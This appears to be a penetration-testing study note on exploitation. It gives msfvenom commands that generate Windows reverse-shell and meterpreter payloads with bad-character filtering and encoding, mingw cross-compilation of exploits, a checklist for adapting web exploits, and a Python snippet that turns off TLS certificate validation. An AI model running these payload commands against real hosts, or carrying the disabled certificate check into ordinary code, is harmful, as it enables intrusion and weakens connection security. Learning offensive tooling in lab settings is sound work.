---
title: Exploitation
---
# Payload Generation
## MSFVENOM
- We can create payloads using `msfvenom`
```zsh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.197 LPORT=9001 EXITFUNC=thread â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c

msfvenom -p windows/x64/vncinject/bind_ipv6_tcp_uuid q LHOST=192.168.45.197 LPORT=9001 -f python -b "\x00\x20" -v shellcode
```
- Specify payload with `-p
- Specify bad characters with `-b`
- Specify output format with `-f`
- Specify variable name of output with `-v`
# Compiling exploits
## Cross Compiling to Windows
- We can use `minwg` to cross compile code for Windows platforms
```zsh
i686-w64-mingw32-gcc code.c -o exploit.exe
```
- The option `-l` to link local libraries. For example the `ws2_32` winsock library can be linked with
```zsh
i686-w64-mingw32-gcc code.c -o exploit.exe -lws2_32
```
# Fixing Exploits
## Fixing Web Exploits
- When fixing web exploits, a set of questions has to be asked
	-  Does it initiate an HTTP or HTTPS connection?
	- Does it access a specific web application path or route?
	- Does the exploit leverage a pre-authentication vulnerability?
	- If not, how does the exploit authenticate to the web application?
	- How are the GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
	- Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
	- Will oddities such as self-signed certificates disrupt the exploit?
	- Additional protections like `.htacces` or a WAF present?
### No certificate validation
- If the exploit is written in python we can add `verify=false` to the request method
```python
response  = requests.post(url, data=data, allow_redirects=False, verify=False)
```